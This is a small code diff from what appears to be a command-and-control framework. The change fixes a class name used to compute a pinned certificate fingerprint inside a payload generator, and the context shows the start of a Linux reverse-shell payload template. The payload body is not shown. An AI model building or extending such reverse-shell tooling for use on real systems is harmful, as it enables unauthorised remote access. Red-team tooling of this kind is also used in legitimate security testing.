@@ -253,7 +253,7 @@ class C2Framework(BaseModule):
                 f"C2_CERT_MISSING: cannot generate payload without pinned cert at {cert_path}. "
                 "Start the Ghost listener first (it auto-generates the cert) or set SHADOWCYPHER_C2_CERT."
             )
-        fingerprint = C2Module._compute_cert_fingerprint(cert_path)
+        fingerprint = C2Framework._compute_cert_fingerprint(cert_path)
 
         if payload_type == "reverse_shell" and platform == "linux":
             payload = f'''#!/usr/bin/env python3
